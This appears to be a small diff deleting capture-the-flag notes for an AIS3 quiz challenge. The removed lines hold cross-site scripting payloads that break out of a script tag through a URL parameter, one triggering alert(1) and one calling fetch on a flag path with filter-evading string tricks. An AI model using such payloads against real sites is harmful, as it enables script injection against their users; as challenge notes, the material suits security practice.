@@ -1,5 +1,0 @@
-1. Trigger alert(1) in Firefox
-	http://quiz.ais3.org:8003/?message=</script><script>alert(1)// 
-
-
-</script><script>fetch(String(/getflag/).substr(1)//
